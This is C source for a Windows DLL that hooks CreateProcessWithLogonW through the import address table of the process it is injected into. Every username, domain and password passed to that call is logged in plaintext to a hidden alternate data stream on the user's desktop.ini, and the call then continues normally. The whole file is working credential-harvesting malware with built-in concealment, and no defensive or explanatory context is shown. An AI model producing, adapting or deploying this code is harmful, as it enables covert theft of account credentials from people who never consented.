#include "pch.h"
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlobj.h>

#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

#define ORIGINAL_FILE_PATH "C:\\Users\\%USERNAME%\\Desktop\\desktop.ini"
#define ADS_NAME ":log"

BOOL(WINAPI* pCreateProcessWithLogonW)(
    LPCWSTR lpUsername,
    LPCWSTR lpDomain,
    LPCWSTR lpPassword,
    DWORD dwLogonFlags,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation) = CreateProcessWithLogonW;

void LogCredentials(LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword) {
    char resolvedPath[MAX_PATH];
    ExpandEnvironmentStringsA(ORIGINAL_FILE_PATH, resolvedPath, MAX_PATH);
    strcat(resolvedPath, ADS_NAME);

    FILE* file = fopen(resolvedPath, "a+"); // Append mode for ADS stream
    if (!file) {
        return;
    }
    fwprintf(file, L"[+] Captured Credentials:\nUsername: %s\nDomain: %s\nPassword: %s\n\n",
        lpUsername ? lpUsername : L"(null)",
        lpDomain ? lpDomain : L"(null)",
        lpPassword ? lpPassword : L"(null)");
    fclose(file);
}

int MyHookingFunc(
    LPCWSTR lpUsername,
    LPCWSTR lpDomain,
    LPCWSTR lpPassword,
    DWORD dwLogonFlags,
    LPCWSTR lpApplicationName,
    LPWSTR lpCommandLine,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCWSTR lpCurrentDirectory,
    LPSTARTUPINFOW lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation)
{
    LogCredentials(lpUsername, lpDomain, lpPassword);

    return pCreateProcessWithLogonW(
        lpUsername,
        lpDomain,
        lpPassword,
        dwLogonFlags,
        lpApplicationName,
        lpCommandLine,
        dwCreationFlags,
        lpEnvironment,
        lpCurrentDirectory,
        lpStartupInfo,
        lpProcessInformation
    );
}

BOOL Hookit(char* dllName, char* FunctionName, LPVOID myFunc) {
    DWORD oldProtect = 0;
    HANDLE ImageBase = GetModuleHandle(NULL);
    IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)ImageBase;
    IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)ImageBase + DOS_HEADER->e_lfanew);
    IMAGE_IMPORT_DESCRIPTOR* IMPORT_DATA = (IMAGE_IMPORT_DESCRIPTOR*)((DWORD64)ImageBase + NT_HEADER->OptionalHeader.DataDirectory[1].VirtualAddress);

    LPCSTR ModuleName = "";
    BOOL found = FALSE;

    while (IMPORT_DATA->Name != NULL) {
        ModuleName = (LPCSTR)IMPORT_DATA->Name + (DWORD64)ImageBase;
        if (_stricmp(ModuleName, dllName) == 0) {
            found = TRUE;
            break;
        }
        IMPORT_DATA++;
    }
    if (!found) return FALSE;

    LPVOID FuncAddr = GetProcAddress(GetModuleHandleA(dllName), FunctionName);
    IMAGE_THUNK_DATA* thunk = (IMAGE_THUNK_DATA*)((DWORD64)ImageBase + IMPORT_DATA->FirstThunk);
    while (thunk->u1.Function) {
        LPVOID* FunctionAddr = (LPVOID*)&thunk->u1.Function;
        if (*FunctionAddr == FuncAddr) {
            VirtualProtect((LPVOID)FunctionAddr, sizeof(LPVOID), PAGE_READWRITE, &oldProtect);
            *FunctionAddr = myFunc;
            VirtualProtect((LPVOID)FunctionAddr, sizeof(LPVOID), oldProtect, &oldProtect);
            return TRUE;
        }
        thunk++;
    }
    return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        Hookit((char*)"Advapi32.dll", (char*)"CreateProcessWithLogonW", (LPVOID)MyHookingFunc);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
